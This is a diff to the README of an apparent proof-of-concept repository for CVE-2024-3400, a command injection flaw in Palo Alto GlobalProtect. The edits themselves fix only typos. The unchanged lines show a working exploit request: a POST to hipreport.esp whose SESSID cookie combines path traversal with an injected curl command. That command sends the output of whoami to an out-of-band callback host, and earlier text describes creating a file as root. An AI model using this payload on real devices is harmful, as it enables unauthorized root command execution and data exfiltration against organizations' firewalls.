@@ -21,7 +21,7 @@ Content-Length: 0
 
 you will create hellome1337.txt file on the server with root access 
 
-now if you try to access the files you should receive 403 insted of 404
+now if you try to access the files you should receive 403 instead of 404
 
 ![image](https://github.com/h4x0r-dz/CVE-2024-3400/assets/26070859/e579d4a6-11a5-4f7c-a3da-ba7b0cfa8a4d)
 
@@ -29,7 +29,7 @@ now if you try to access the files you should receive 403 insted of 404
 
 ```
 POST /ssl-vpn/hipreport.esp HTTP/1.1
-Host: 127.0.01
+Host: 127.0.0.1
 Cookie: SESSID=./../../../opt/panlogs/tmp/device_telemetry/minute/h4`curl${IFS}xxxxxxxxxxxxxxxxx.oast.fun?test=$(whoami)`;
 Connection: close
 Content-Type: application/x-www-form-urlencoded
@@ -43,4 +43,3 @@ Content-Length: 0
 More Info : 
 https://attackerkb.com/topics/SSTk336Tmf/cve-2024-3400/rapid7-analysis
 https://labs.watchtowr.com/palo-alto-putting-the-protecc-in-globalprotect-cve-2024-3400/
-
